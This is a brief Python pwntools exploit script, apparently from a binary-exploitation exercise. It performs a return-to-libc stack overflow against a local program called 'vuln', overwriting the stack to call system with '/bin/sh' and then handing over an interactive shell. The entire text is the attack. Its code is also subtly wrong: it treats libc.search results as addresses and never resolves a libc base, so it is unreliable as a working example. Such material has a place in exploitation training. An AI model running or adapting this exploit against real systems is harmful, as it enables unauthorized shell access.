from pwn import *

libc = ELF("libc.so.6")

p = process("./vuln")

payload = "a" * 121 # padding buffer
payload += p32(libc.search("system")) # address of system
payload += "a" * 4# pad system address
payload += p32(libc.search("/bin/sh")) # pass /bin/sh string via stack

print(payload)

p.sendline(payload)
p.interactive()
